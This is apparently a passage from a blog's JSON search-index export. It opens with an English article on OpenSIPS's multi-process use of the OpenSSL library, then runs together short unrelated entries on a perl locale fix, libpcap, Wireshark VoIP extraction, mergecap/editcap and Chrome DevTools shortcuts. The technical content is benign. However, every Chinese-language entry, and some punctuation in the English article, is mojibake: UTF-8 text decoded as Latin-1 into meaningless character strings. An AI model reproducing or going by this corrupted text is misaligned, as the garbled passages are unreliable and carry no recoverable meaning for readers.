OpenSSL was releasing revision 0.9.6. Thatâ€™s the version that we have used for the original design and implementation.OpenSIPS is a multi-process server, that is able to handle SIP requests or replies in multiple processes, in parallel. When a message is received it is â€œassignedâ€ to any of its free processes, that is responsible of the entire processing of that message. Any of these messages might decide, based on the routing logic, that the request has to be forwarded to the next hop using TLS. This means that any OpenSIPS process worker needs to be able to forward a message using SSL/TLS connections. And naturally, since all these processes run simultaneously, multiple processes can decide to forward the messages to the same TLS destination, raising various consistency concerns.In terms of design, there were three possible ways of ensuring consistency in this multi-process environment:\nEach process has its own SSL/TLS connection towards each destination. This means that if you have N workers and M destinations, your OpenSIPS server will have to maintain NxM connections. Thatâ€™s something we should avoid. Map each SSL/TLS connection with a worker, and only that worker is allowed to communicate with that endpoint. When a different process has to forward a message to a specific endpoint, it will first send the message/job to the designated worker, which forwards it down to the next hop. Although this looks OK, it involves an extra layer or inter-process communication, for the job dispatching, and it is also prone to scalability issues (for example when the destination is a TLS trunk). Keep a single SSL/TLS connection to each destination throughout all the processes, and make sure thereâ€™s a mutual concurrent access to it. This seems to be the most elegant solution, as your SIP interconnections will always see a single TLS connection towards your server. However, ensuring mutual access to the connection is not that trivial, as you will see throughout this article. Nevertheless, since in OpenSIPS we need to address both scalability and ease interconnection with other SIP endpoints, we decided to implement solution number 3.\nInitial Implementation Although even back then it was advertised as a multi-threaded library, OpenSSL was exposing hooks to use it in a multi-process environment:\nCRYPTO_set_mem_functions() hook could be used to have the library use a custom memory allocator. We set this function to make sure OpenSSL allocates the SSL context in a shared memory, so that it can be accessed by any process **CRYPTO_set_id_callback()Â **was used to determine the thread that OpenSSL was running into. We used this callback to indicate that the â€œthreadâ€ was actually a process, and each of them has its own id, namely the Process ID (PID) CRYPTO_set_locking_callback() was exposing hooks to perform create, lock, unlock and delete using â€œuserâ€ specified locking mechanisms. Using this function we were able to â€œguardâ€ the SSL shared context (allocated in our shared memory) using OpenSIPS specific multi-process shared locking mechanisms. That being said, we had all the ingredients to implement our chosen solution using OpenSSL, all we had to do was to glue them together. This is how the first implementation of SSL/TLS communication appeared in OpenSIPS. And it worked out just great throughout the years, up until OpenSSL version (including) 1.0.2.\nOpenSSL 1.1.0 new threading API The turning point On 25th of August 2016, when OpenSSL 1.1.0, was released, the OpenSSL team decided to implement a new threading API. In order to provide a nicer usage experience to multi-threaded applications that were using the OpenSSL libraries, they dropped the previously used threading mechanism and replaced it with an their own (hardcoded) implementation using pthreads (for Linux). This means that we could no longer use the CRYPTO_set_locking_callback() hooks, as they became obsolete.Since we were still allocating SSL contexts in shared memory, the locking mechanisms (i.e. pthread mutex structures) were also allocated in shared memory. Therefore, when OpenSSL was using them to guard the shared context, it was actually still using a â€œsharedâ€ memory, therefore the other processes were able to see that the lock/pthread mutex is acquired, resulting (in theory) in a successful mutual exclusion to the shared context.\nThe issue In practice, however, this resulted in a deadlock (see tickets #1590 #1755 , #1767). Although in general it was working fine, the problem appears when thereâ€™s a contention trying to acquire the pthread mutex from two different processes at the same time. Imagine process P1 and P2 trying to acquire mutex M in parallel: P1 gets first and acquires M; P2 then tries to acquire it â€“ because M is in shared memory, it detects that M is already acquired (by P1), thus it blocks waiting for it to be released. When P1 finishes the processing, it releases M. However, due to the fact that pthreads by default is not meant to be shared between processes, P2 is not informed that M was released, thus remaining stuck. This was a problem very hard to debug, because when a process gets stuck, the first thing to do is to run a trap (opensipsctl trap) and check which process is blocked. However, when running trap gdb is executed on each OpenSIPS process, therefore each process is â€œinterruptedâ€ to do a GDB dump. Therefore our trap command would actually awake P2, make it re-evaluate the status of M, and basically unblocking the process and â€œfixingâ€ the â€œdeadlockâ€.\nThe solution Luckily, after a lot of tests and brainstorming, we managed to pinpoint the issue. The fix was quite simple â€“ all we had to do was to set the PTHREAD_PROCESS_SHARED attribute to the pthread shared mutex. However, these mutexes are encapsulated in the openssl library, and thereâ€™s no hooks to tune them. After trying to pick some brains from the OpenSSL team, we realized that they are not interested in supporting that, therefore we had to take this issue in our own hands. Thatâ€™s when we used a trick to overload the **pthread_mutex_init()Â **and **pthread_rwlock_init()Â **with our own implementation, that was also setting the shared attribute. And our SSL/TLS implementation started to work again.\nOpenSSL 1.1.1 new challenges New crashes Once with the OpenSSL 1.1.1 release on 11th of September 2018, new issues started to appear. Due to the fact that the OpenSSL team was trying to make their code base even more thread friendly (without considering the multi-process applications effects), they started to move most of their internal objects in TLS (thread local storage) memory zones. Although OpenSIPS was still allocating OpenSSL contexts in shared memory, these were stored in some locations where only one thread have access. Mixing the two memory management mechanisms resulted in several, unexpected crashes in the SSL library (see ticket #1799).\nFixing attempts After reading the OpenSSL library code and understanding the problem, our first idea was to implement a thread local storage that was compatible with multiple processes. This was our first attempt to fix the issue: overwrite the pthread_key_create(), pthread_getspecific() and pthread_setspecific() functions, similarly to the solution we had for OpenSSL 1.1.0 issues, to make them multi-process aware. Unfortunately our solution failed because of two reasons: although the library was no longer crashing, hence the memory operations were now valid, most of the concurrent connections were rejected (only 2 out of 10 SSL accepts were passing through). So this indicated us that there are still some issues with the internal data â€“ although it is now accessible, most likely there is no concurrent access to it, resulting in unexpected behavior. A second issue with this approach was that overwriting the thread local storage implementation was not only done for the OpenSSL library, but for all the other libraries that were used by OpenSIPS. And since those libraries most likely do not use OpenSIPS managed memory, this might introduce bugs in other libraries â€“ therefore we had to drop this solution.The second attempt to fix this issue came from inspecting the stack trace of the crashes, combined with vitalikvoipâ€˜s suggestion, which were indicating that the problem was within the pseudo random-number generator (RAND_DRBG_bytes()). Therefore we proceeded by using the RAND_set_rand_method() hooks to guard the process of random numbers generators. Although this stopped the crashes, connections were still not properly accepted (again, 8 out of 10 were rejected), so we were back to square one.\nFinal fix Since the problem was not sorted out, we started to dig more into OpenSSL thread safety considerations and discussions (see OpenSSL ticket #2165), and try to understand how these translate to process safety. These made us wonder if it is OK to have a SSL_CTX (the context that manages what certificates, ciphers and other settings are to be used for new connections) shared among all processes. Therefore our next attempt to fix this issue was to duplicate the context (not the connection context, but the global context of SSL) in each process, and use each processâ€™ context to create new connections. And VoillÃ , OpenSIPS started to accept all the connections, without any issues!After running a set of tests, both by us and our community, we concluded that the issue was the fact that the global SSL context was shared among OpenSIPS processes. Unfortunately this was not a diagnose that we could have come up with easily, due to the fact that this was working just fine up until version 1.1.1, and there were no indications in the OpenSSL documentation that this behavior has changed. Hence, the long-term process of solving this issue.\nConclusions As described throughout the article, running OpenSSL in a multi-process environment, with a context that is shared among multiple processes, is definitely doable. However, without support from the library itself (such as offering locking and memory allocations hooks and providing exhaustive documentation), it becomes more and more complicated to maintain the current implementation. Thatâ€™s why in the future we are are planning to look into different alternatives for TLS (i.e. more multi-process friendly libraries).But until then, you can use OpenSIPS with the latest OpenSSL TLS implementation without any issues!Many thanks to vitalikvoip and danpascu for their valuable input on the latest matters, as well as to the whole OpenSIPS core team for all the brainstorming sessions for these issues (and not only :)). Although they were not easy to solve, it was definitely a lot of fun dealing with them.If you want to find out more information regarding this topic (and not only), make sure you do not miss this yearâ€™s OpenSIPS Summit on 5th-8th May 2020, in Amsterdam, Netherlands.\n","permalink":"https://wdd.js.org/opensips/blog/openssl-opensips/","summary":"In order to provide secure SIP communication over TLS connections, OpenSIPS uses the OpenSSL library, probably the most widely used open-source TLS \u0026amp; SSL library across the Internet. The fact that it is so popular and largely used makes it more robust, therefore a great choice to enforce security in a system! That was the reason it was chosen to be used in OpenSIPS in the first place. However, being designed as a multi-threaded library, while OpenSIPS is a multi-process application, integrating it was not an easy task.","title":"The OpenSIPS and OpenSSL journey"},{"content":"perl: warning: Setting locale failed. perl: warning: Please check that your locale settings: LANGUAGE = (unset), LC_ALL = (unset), LC_CTYPE = \u0026#34;UTF-8\u0026#34;, LANG = \u0026#34;en_US.UTF-8\u0026#34; are supported and installed on your system. perl: warning: Falling back to the standard locale (\u0026#34;C\u0026#34;). add in .bashrc\nexport LANG=en_US.UTF-8 export LANGUAGE=en_US.UTF-8 export LC_COLLATE=C export LC_CTYPE=en_US.UTF-8 source ~/.bashrc\n","permalink":"https://wdd.js.org/posts/2020/12/setting-locale-failed/","summary":"perl: warning: Setting locale failed. perl: warning: Please check that your locale settings: LANGUAGE = (unset), LC_ALL = (unset), LC_CTYPE = \u0026#34;UTF-8\u0026#34;, LANG = \u0026#34;en_US.UTF-8\u0026#34; are supported and installed on your system. perl: warning: Falling back to the standard locale (\u0026#34;C\u0026#34;). add in .bashrc\nexport LANG=en_US.UTF-8 export LANGUAGE=en_US.UTF-8 export LC_COLLATE=C export LC_CTYPE=en_US.UTF-8 source ~/.bashrc","title":"perl: warning: Setting locale failed."},{"content":"ä½¿ç”¨è§¦æ‘¸æ¿ï¼Œå¯ä»¥å·¦å³æ»‘åŠ¨ï¼Œæ¥å·¦å³æ»šåŠ¨åªèƒ½éƒ¨åˆ†æ˜¾ç¤ºçš„é¡µé¢ã€‚ä½†æ˜¯åœ¨ç”¨é¼ æ ‡çš„æ—¶å€™ï¼Œç”±äºé¼ æ ‡æ»šè½®åªèƒ½ä¸Šä¸‹æ»šåŠ¨é¡µé¢ï¼Œæ‰€ä»¥ä¸å¤ªæ–¹ä¾¿ã€‚\næ­¤æ—¶ï¼Œä½ å¯ä»¥æŒ‰ä½shift + æ»šåŠ¨é¼ æ ‡æ»šè½®ï¼Œæ¥å®ç°å·¦å³æ»šåŠ¨é¡µé¢\n","permalink":"https://wdd.js.org/posts/2020/12/yor2t9/","summary":"ä½¿ç”¨è§¦æ‘¸æ¿ï¼Œå¯ä»¥å·¦å³æ»‘åŠ¨ï¼Œæ¥å·¦å³æ»šåŠ¨åªèƒ½éƒ¨åˆ†æ˜¾ç¤ºçš„é¡µé¢ã€‚ä½†æ˜¯åœ¨ç”¨é¼ æ ‡çš„æ—¶å€™ï¼Œç”±äºé¼ æ ‡æ»šè½®åªèƒ½ä¸Šä¸‹æ»šåŠ¨é¡µé¢ï¼Œæ‰€ä»¥ä¸å¤ªæ–¹ä¾¿ã€‚\næ­¤æ—¶ï¼Œä½ å¯ä»¥æŒ‰ä½shift + æ»šåŠ¨é¼ æ ‡æ»šè½®ï¼Œæ¥å®ç°å·¦å³æ»šåŠ¨é¡µé¢","title":"Get: shift + é¼ æ ‡æ»šè½® å·¦å³æ»šåŠ¨é¡µé¢"},{"content":"ethereal-tcpdump.pdf\n","permalink":"https://wdd.js.org/network/hhlfi1/","summary":"ethereal-tcpdump.pdf","title":"tcpdump filters"},{"content":"libpcap-tutorial.pdf\n","permalink":"https://wdd.js.org/network/ivzphz/","summary":"libpcap-tutorial.pdf","title":"libpcap tutorial"},{"content":"tcpdump-zine.pdf\n","permalink":"https://wdd.js.org/network/yscigi/","summary":"tcpdump-zine.pdf","title":"tcpdump zine"},{"content":"å‡†å¤‡æ¡ä»¶ æœ‰gccç¼–è¯‘å™¨ å®‰è£…libpcapåŒ… 1.c è¯•è¿è¡Œ #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;pcap.h\u0026gt; int main(int argc, char *argv[]) { char *dev = argv[1]; printf(\u0026#34;Device: %s\\n\u0026#34;, dev); return(0); } gcc ./1.c -o 1.exe -lpcap demo-libpcap git:(master) âœ— ./1.exe eth0 Device: eth0 ç¬¬ä¸€ä¸ªæ —å­éå¸¸ç®€å•ï¼Œä»…ä»…æ˜¯æµ‹è¯•ç›¸å…³çš„åº“æ˜¯å¦åŠ è½½æ­£ç¡®\n2.c è·å–é»˜è®¤ç½‘å¡åç§° å‚è€ƒ http://www.tcpdump.org/pcap.html ","permalink":"https://wdd.js.org/network/uq5cii/","summary":"å‡†å¤‡æ¡ä»¶ æœ‰gccç¼–è¯‘å™¨ å®‰è£…libpcapåŒ… 1.c è¯•è¿è¡Œ #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;pcap.h\u0026gt; int main(int argc, char *argv[]) { char *dev = argv[1]; printf(\u0026#34;Device: %s\\n\u0026#34;, dev); return(0); } gcc ./1.c -o 1.exe -lpcap demo-libpcap git:(master) âœ— ./1.exe eth0 Device: eth0 ç¬¬ä¸€ä¸ªæ —å­éå¸¸ç®€å•ï¼Œä»…ä»…æ˜¯æµ‹è¯•ç›¸å…³çš„åº“æ˜¯å¦åŠ è½½æ­£ç¡®\n2.c è·å–é»˜è®¤ç½‘å¡åç§° å‚è€ƒ http://www.tcpdump.org/pcap.html ","title":"pcapæŠ“åŒ…æ•™ç¨‹"},{"content":"ä½¿ç”¨tcpdumpåœ¨æœåŠ¡ç«¯æŠ“åŒ…ï¼Œå°†æŠ“åŒ…åçš„æ–‡ä»¶åœ¨wiresharkä¸­æ‰“å¼€ã€‚\nç„¶åé€‰æ‹©ï¼šTelephony - VoIP Callsï¼Œwiresharkå¯ä»¥ä»æŠ“åŒ…æ–‡ä»¶ä¸­æå–å‡ºSIPå‘¼å«åˆ—è¡¨ã€‚\nå‘¼å«åˆ—è¡¨é¡µé¢ åœ¨å‘¼å«åˆ—è¡¨é¡µé¢ï¼Œé€‰æ‹©ä¸€æ¡å‘¼å«è®°å½•ï¼Œç‚¹å‡»Flow Sequenceï¼Œ å¯ä»¥æŸ¥çœ‹è¯¥å‘¼å«çš„SIPæ—¶åºå›¾ã€‚ç‚¹å‡»Play Streamï¼Œ å¯ä»¥æ’­æ”¾è¯¥æ¡å‘¼å«çš„å£°éŸ³ã€‚\nRTPplayé¡µé¢æœ‰æ’­æ”¾æŒ‰é’®ï¼Œç‚¹å‡»æ’­æ”¾å¯ä»¥å¬åˆ°é€šè¯å£°éŸ³ã€‚\n","permalink":"https://wdd.js.org/network/zgftde/","summary":"ä½¿ç”¨tcpdumpåœ¨æœåŠ¡ç«¯æŠ“åŒ…ï¼Œå°†æŠ“åŒ…åçš„æ–‡ä»¶åœ¨wiresharkä¸­æ‰“å¼€ã€‚\nç„¶åé€‰æ‹©ï¼šTelephony - VoIP Callsï¼Œwiresharkå¯ä»¥ä»æŠ“åŒ…æ–‡ä»¶ä¸­æå–å‡ºSIPå‘¼å«åˆ—è¡¨ã€‚\nå‘¼å«åˆ—è¡¨é¡µé¢ åœ¨å‘¼å«åˆ—è¡¨é¡µé¢ï¼Œé€‰æ‹©ä¸€æ¡å‘¼å«è®°å½•ï¼Œç‚¹å‡»Flow Sequenceï¼Œ å¯ä»¥æŸ¥çœ‹è¯¥å‘¼å«çš„SIPæ—¶åºå›¾ã€‚ç‚¹å‡»Play Streamï¼Œ å¯ä»¥æ’­æ”¾è¯¥æ¡å‘¼å«çš„å£°éŸ³ã€‚\nRTPplayé¡µé¢æœ‰æ’­æ”¾æŒ‰é’®ï¼Œç‚¹å‡»æ’­æ”¾å¯ä»¥å¬åˆ°é€šè¯å£°éŸ³ã€‚","title":"wiresharkä»pcapä¸­æå–è¯­éŸ³æ–‡ä»¶"},{"content":"tcpdumpå¯ä»¥åœ¨æŠ“åŒ…æ—¶ï¼ŒæŒ‰ç…§æŒ‡å®šæ—¶é—´é—´éš”æˆ–è€…æŒ‰ç…§æŒ‡å®šçš„åŒ…å¤§å°ï¼Œäº§ç”Ÿæ–°çš„pcapæ–‡ä»¶ã€‚ç”¨wiresharkåˆ†æè¿™äº›åŒ…æ—¶ï¼Œå¾€å¾€éœ€è¦å°†è¿™äº›åŒ…åšåˆå¹¶æˆ–è€…åˆ†ç¦»æ“ä½œã€‚\nmergecap å¦‚æœå®‰è£…äº†Wiresharké‚£ä¹ˆmergecapå°±ä¼šè‡ªåŠ¨å®‰è£…ï¼Œå¯ä»¥ä½¿ç”¨å®ƒæ¥åˆå¹¶å¤šä¸ªpcapæ–‡ä»¶ã€‚\n// æŒ‰ç…§æ•°æ®åŒ…ä¸­çš„æ—¶é—´é¡ºåºåˆå¹¶æ–‡ä»¶ mergecap -w output.pcap input1.pcap input2.pcap input3.pcap // æŒ‰ç…§å‘½ä»¤è¡Œä¸­çš„è¾“å…¥æ•°æ®åŒ…æ–‡ä»¶é¡ºåºåˆå¹¶æ–‡ä»¶ // ä¸åŠ -a, å¯èƒ½ä¼šå¯¼è‡´SIPæ—¶åºå›¾é‡å¤çš„é—®é¢˜ mergecap -a -w output.pcap input1.pcap input2.pcap input3.pcap editcap å¯¹äºä¸€ä¸ªå¾ˆå¤§çš„pcapæ–‡ä»¶ï¼ŒæŒ‰ç…§æ—¶é—´èŒƒå›´åˆ†å‰²å‡ºæ–°çš„pcapåŒ…\neditcap -A \u0026#39;2014-12-10 10:11:01\u0026#39; -B \u0026#39;2014-12-10 10:21:01\u0026#39; input.pcap output.pcap å‚è€ƒ https://blog.csdn.net/qq_19004627/article/details/82287172 ","permalink":"https://wdd.js.org/network/kgrco2/","summary":"tcpdumpå¯ä»¥åœ¨æŠ“åŒ…æ—¶ï¼ŒæŒ‰ç…§æŒ‡å®šæ—¶é—´é—´éš”æˆ–è€…æŒ‰ç…§æŒ‡å®šçš„åŒ…å¤§å°ï¼Œäº§ç”Ÿæ–°çš„pcapæ–‡ä»¶ã€‚ç”¨wiresharkåˆ†æè¿™äº›åŒ…æ—¶ï¼Œå¾€å¾€éœ€è¦å°†è¿™äº›åŒ…åšåˆå¹¶æˆ–è€…åˆ†ç¦»æ“ä½œã€‚\nmergecap å¦‚æœå®‰è£…äº†Wiresharké‚£ä¹ˆmergecapå°±ä¼šè‡ªåŠ¨å®‰è£…ï¼Œå¯ä»¥ä½¿ç”¨å®ƒæ¥åˆå¹¶å¤šä¸ªpcapæ–‡ä»¶ã€‚\n// æŒ‰ç…§æ•°æ®åŒ…ä¸­çš„æ—¶é—´é¡ºåºåˆå¹¶æ–‡ä»¶ mergecap -w output.pcap input1.pcap input2.pcap input3.pcap // æŒ‰ç…§å‘½ä»¤è¡Œä¸­çš„è¾“å…¥æ•°æ®åŒ…æ–‡ä»¶é¡ºåºåˆå¹¶æ–‡ä»¶ // ä¸åŠ -a, å¯èƒ½ä¼šå¯¼è‡´SIPæ—¶åºå›¾é‡å¤çš„é—®é¢˜ mergecap -a -w output.pcap input1.pcap input2.pcap input3.pcap editcap å¯¹äºä¸€ä¸ªå¾ˆå¤§çš„pcapæ–‡ä»¶ï¼ŒæŒ‰ç…§æ—¶é—´èŒƒå›´åˆ†å‰²å‡ºæ–°çš„pcapåŒ…\neditcap -A \u0026#39;2014-12-10 10:11:01\u0026#39; -B \u0026#39;2014-12-10 10:21:01\u0026#39; input.pcap output.pcap å‚è€ƒ https://blog.csdn.net/qq_19004627/article/details/82287172 ","title":"wiresharkåˆå¹¶å’ŒæŒ‰æ—¶é—´æˆªå–pcapæ–‡ä»¶"},{"content":"æœ¬é¡µä»‹ç» Chrome DevTools ä¸­æ‰€æœ‰é”®ç›˜å¿«æ·é”®çš„å‚è€ƒä¿¡æ¯ã€‚ä¸€äº›å¿«æ·é”®å…¨å±€å¯ç”¨ï¼Œè€Œå…¶ä»–å¿«æ·é”®ä¼šç‰¹å®šäºå•ä¸€é¢æ¿ã€‚æ‚¨ä¹Ÿå¯ä»¥åœ¨æç¤ºä¸­æ‰¾åˆ°å¿«æ·é”®ã€‚å°†é¼ æ ‡æ‚¬åœåœ¨ DevTools çš„ UI å…ƒç´ ä¸Šå¯ä»¥æ˜¾ç¤ºå…ƒç´ çš„æç¤ºã€‚ å¦‚æœå…ƒç´ æœ‰å¿«æ·é”®ï¼Œæç¤ºå°†åŒ…å«å¿«æ·é”®ã€‚\nè®¿é—® DevTools è®¿é—® DevTools åœ¨ Windows ä¸Š åœ¨ Mac ä¸Š æ‰“å¼€ Developer Tools F12ã€CtrlÂ +Â ShiftÂ +Â I CmdÂ +Â OptÂ +Â I æ‰“å¼€/åˆ‡æ¢æ£€æŸ¥å…ƒç´ æ¨¡å¼å’Œæµè§ˆå™¨çª—å£ CtrlÂ +Â ShiftÂ +Â C CmdÂ +Â ShiftÂ +Â C æ‰“å¼€ Developer Tools å¹¶èšç„¦åˆ°æ§åˆ¶å° CtrlÂ +Â ShiftÂ +Â J CmdÂ +Â OptÂ +Â J æ£€æŸ¥æ£€æŸ¥å™¨ï¼ˆå–æ¶ˆåœé ç¬¬ä¸€ä¸ªåæŒ‰ï¼‰ CtrlÂ +Â ShiftÂ +Â I CmdÂ +Â OptÂ +Â I å…¨å±€é”®ç›˜å¿«æ·é”® ä¸‹åˆ—é”®ç›˜å¿«æ·é”®å¯ä»¥åœ¨æ‰€æœ‰ DevTools é¢æ¿ä¸­ä½¿ç”¨ï¼š\nå…¨å±€å¿«æ·é”® Windows Mac æ˜¾ç¤ºä¸€èˆ¬è®¾ç½®å¯¹è¯æ¡† ?ã€F1 ? å…‰æ ‡å®šä½åˆ°åœ°å€æ  Ctrl + L Cmd + L ä¸‹ä¸€ä¸ªé¢æ¿ CtrlÂ +Â ] CmdÂ +Â ] ä¸Šä¸€ä¸ªé¢æ¿ CtrlÂ +Â [ CmdÂ +Â [ åœ¨é¢æ¿å†å²è®°å½•ä¸­åé€€ CtrlÂ +Â AltÂ +Â [ CmdÂ +Â OptÂ +Â [ åœ¨é¢æ¿å†å²è®°å½•ä¸­å‰è¿› CtrlÂ +Â AltÂ +Â ] CmdÂ +Â OptÂ +Â ] æ›´æ”¹åœé ä½ç½® CtrlÂ +Â ShiftÂ +Â D CmdÂ +Â ShiftÂ +Â D æ‰“å¼€ Device Mode CtrlÂ +Â ShiftÂ +Â M CmdÂ +Â ShiftÂ +Â M åˆ‡æ¢æ§åˆ¶å°/åœ¨è®¾ç½®å¯¹è¯æ¡†æ‰“å¼€æ—¶å°†å…¶å…³é—­ Esc Esc åˆ·æ–°é¡µé¢ F5ã€CtrlÂ +Â R CmdÂ +Â R åˆ·æ–°å¿½ç•¥ç¼“å­˜å†…å®¹çš„é¡µé¢ CtrlÂ +Â F5ã€CtrlÂ +Â ShiftÂ +Â R CmdÂ +Â ShiftÂ +Â R åœ¨å½“å‰æ–‡ä»¶æˆ–é¢æ¿ä¸­æœç´¢æ–‡æœ¬ CtrlÂ +Â F CmdÂ +Â F åœ¨æ‰€æœ‰æºä¸­æœç´¢æ–‡æœ¬ CtrlÂ +Â ShiftÂ +Â F CmdÂ +Â OptÂ +Â F æŒ‰æ–‡ä»¶åæœç´¢ï¼ˆé™¤äº†åœ¨ Timeline ä¸Šï¼‰ CtrlÂ +Â Oã€CtrlÂ +Â P CmdÂ +Â Oã€CmdÂ +Â P æ”¾å¤§ï¼ˆç„¦ç‚¹åœ¨ DevTools ä¸­æ—¶ï¼‰ CtrlÂ +Â + CmdÂ +Â ShiftÂ +Â + ç¼©å° CtrlÂ +Â - CmdÂ +Â ShiftÂ +Â - æ¢å¤é»˜è®¤æ–‡æœ¬å¤§å° CtrlÂ +Â 0 CmdÂ +Â 0 æŒ‰é¢æ¿åˆ†ç±»çš„é”®ç›˜å¿«æ·é”® Elements Elements é¢æ¿ Windows Mac æ’¤æ¶ˆæ›´æ”¹ CtrlÂ +Â Z CmdÂ +Â Z é‡åšæ›´æ”¹ CtrlÂ +Â Y CmdÂ +Â Yã€CmdÂ +Â ShiftÂ +Â Z å¯¼èˆª å‘ä¸Šé”®ã€å‘ä¸‹é”® å‘ä¸Šé”®ã€å‘ä¸‹é”® å±•å¼€/æŠ˜å èŠ‚ç‚¹ å‘å³é”®ã€å‘å·¦é”® å‘å³é”®ã€å‘å·¦é”® å±•å¼€èŠ‚ç‚¹ ç‚¹å‡»ç®­å¤´ ç‚¹å‡»ç®­å¤´ å±•å¼€/æŠ˜å èŠ‚ç‚¹åŠå…¶æ‰€æœ‰å­èŠ‚ç‚¹ CtrlÂ +Â AltÂ +Â ç‚¹å‡»ç®­å¤´å›¾æ ‡ OptÂ +Â ç‚¹å‡»ç®­å¤´å›¾æ ‡ ç¼–è¾‘å±æ€§ Enterã€åŒå‡»å±æ€§ Enterã€åŒå‡»å±æ€§ éšè—å…ƒç´  H H åˆ‡æ¢ä¸ºä»¥ HTML å½¢å¼ç¼–è¾‘ F2 Styles è¾¹æ  Styles è¾¹æ ä¸­å¯ç”¨çš„å¿«æ·é”®ï¼š\nStyles è¾¹æ  Windows Mac ç¼–è¾‘è§„åˆ™ ç‚¹å‡» ç‚¹å‡» æ’å…¥æ–°å±æ€§ ç‚¹å‡»ç©ºæ ¼ ç‚¹å‡»ç©ºæ ¼ è½¬åˆ°æºä¸­æ ·å¼è§„åˆ™å±æ€§å£°æ˜è¡Œ CtrlÂ +Â ç‚¹å‡»å±æ€§ CmdÂ +Â ç‚¹å‡»å±æ€§ è½¬åˆ°æºä¸­å±æ€§å€¼å£°æ˜è¡Œ CtrlÂ +Â ç‚¹å‡»å±æ€§å€¼ CmdÂ +Â ç‚¹å‡»å±æ€§å€¼ åœ¨é¢œè‰²å®šä¹‰å€¼ä¹‹é—´å¾ªç¯ ShiftÂ +Â ç‚¹å‡»é¢œè‰²é€‰å–å™¨æ¡† ShiftÂ +Â ç‚¹å‡»é¢œè‰²é€‰å–å™¨æ¡† ç¼–è¾‘ä¸‹ä¸€ä¸ª/ä¸Šä¸€ä¸ªå±æ€§ Tabã€ShiftÂ +Â Tab Tabã€ShiftÂ +Â Tab å¢å¤§/å‡å°å€¼ å‘ä¸Šé”®ã€å‘ä¸‹é”® å‘ä¸Šé”®ã€å‘ä¸‹é”® ä»¥ 10 ä¸ºå¢é‡å¢å¤§/å‡å°å€¼ ShiftÂ +Â Upã€ShiftÂ +Â Down ShiftÂ +Â Upã€ShiftÂ +Â Down ä»¥ 10 ä¸ºå¢é‡å¢å¤§/å‡å°å€¼ PgUpã€PgDown PgUpã€PgDown ä»¥ 100 ä¸ºå¢é‡å¢å¤§/å‡å°å€¼ ShiftÂ +Â PgUpã€ShiftÂ +Â PgDown ShiftÂ +Â PgUpã€ShiftÂ +Â PgDown ä»¥ 0.1 ä¸ºå¢é‡å¢å¤§/å‡å°å€¼ AltÂ +Â å‘ä¸Šé”®ã€AltÂ +Â å‘ä¸‹é”® OptÂ +Â å‘ä¸Šé”®ã€OptÂ +Â å‘ä¸‹é”® Sources Sources é¢æ¿ Windows Mac æš‚åœ/ç»§ç»­è„šæœ¬æ‰§è¡Œ F8ã€CtrlÂ +Â \\ F8ã€CmdÂ +Â \\ è¶Šè¿‡ä¸‹ä¸€ä¸ªå‡½æ•°è°ƒç”¨ F10ã€CtrlÂ +Â ' F10ã€CmdÂ +Â ' è¿›å…¥ä¸‹ä¸€ä¸ªå‡½æ•°è°ƒç”¨ F11ã€CtrlÂ +Â ; F11ã€CmdÂ +Â ; è·³å‡ºå½“å‰å‡½æ•° ShiftÂ +Â F11ã€CtrlÂ +Â ShiftÂ +Â ; ShiftÂ +Â F11ã€CmdÂ +Â ShiftÂ +Â ; é€‰æ‹©ä¸‹ä¸€ä¸ªè°ƒç”¨æ¡†æ¶ CtrlÂ +Â . OptÂ +Â . é€‰æ‹©ä¸Šä¸€ä¸ªè°ƒç”¨æ¡†æ¶ CtrlÂ +Â , OptÂ +Â , åˆ‡æ¢æ–­ç‚¹æ¡ä»¶ ç‚¹å‡»è¡Œå·ã€CtrlÂ +Â B ç‚¹å‡»è¡Œå·ã€CmdÂ +Â B ç¼–è¾‘æ–­ç‚¹æ¡ä»¶ å³é”®ç‚¹å‡»è¡Œå· å³é”®ç‚¹å‡»è¡Œå· åˆ é™¤å„ä¸ªå•è¯ CtrlÂ +Â Delete OptÂ +Â Delete ä¸ºæŸä¸€è¡Œæˆ–é€‰å®šæ–‡æœ¬æ·»åŠ æ³¨é‡Š CtrlÂ +Â / CmdÂ +Â / å°†æ›´æ”¹ä¿å­˜åˆ°æœ¬åœ°ä¿®æ”¹ CtrlÂ +Â S CmdÂ +Â S ä¿å­˜æ‰€æœ‰æ›´æ”¹ CtrlÂ +Â AltÂ +Â S CmdÂ +Â OptÂ +Â S è½¬åˆ°è¡Œ CtrlÂ +Â G CtrlÂ +Â G æŒ‰æ–‡ä»¶åæœç´¢ CtrlÂ +Â O CmdÂ +Â O è·³è½¬åˆ°è¡Œå· CtrlÂ +Â PÂ + æ•°å­— CmdÂ +Â PÂ + æ•°å­— è·³è½¬åˆ°åˆ— CtrlÂ +Â OÂ + æ•°å­— + æ•°å­— CmdÂ +Â OÂ + æ•°å­— + æ•°å­— è½¬åˆ°æˆå‘˜ CtrlÂ +Â ShiftÂ +Â O CmdÂ +Â ShiftÂ +Â O å…³é—­æ´»åŠ¨æ ‡ç­¾ AltÂ +Â W OptÂ +Â W è¿è¡Œä»£ç æ®µ CtrlÂ +Â Enter CmdÂ +Â Enter åœ¨ä»£ç ç¼–è¾‘å™¨å†… ä»£ç ç¼–è¾‘å™¨ Windows Mac è½¬åˆ°åŒ¹é…çš„æ‹¬å· CtrlÂ +Â M è·³è½¬åˆ°è¡Œå· CtrlÂ +Â PÂ + æ•°å­— CmdÂ +Â PÂ + æ•°å­— è·³è½¬åˆ°åˆ— CtrlÂ +Â OÂ + æ•°å­— + æ•°å­— CmdÂ +Â OÂ + æ•°å­— + æ•°å­— åˆ‡æ¢æ³¨é‡Š CtrlÂ +Â / CmdÂ +Â / é€‰æ‹©ä¸‹ä¸€ä¸ªå®ä¾‹ CtrlÂ +Â D CmdÂ +Â D æ’¤æ¶ˆä¸Šä¸€ä¸ªé€‰æ‹© CtrlÂ +Â U CmdÂ +Â U Timeline Timeline é¢æ¿ Windows Mac å¼€å§‹/åœæ­¢è®°å½• CtrlÂ +Â E CmdÂ +Â E ä¿å­˜æ—¶é—´çº¿æ•°æ® CtrlÂ +Â S CmdÂ +Â S åŠ è½½æ—¶é—´çº¿æ•°æ® CtrlÂ +Â O CmdÂ +Â O Profiles Profiles é¢æ¿ Windows Mac å¼€å§‹/åœæ­¢è®°å½• CtrlÂ +Â E CmdÂ +Â E æ§åˆ¶å° æ§åˆ¶å°å¿«æ·é”® Windows Mac æ¥å—å»ºè®® å‘å³é”® å‘å³é”® 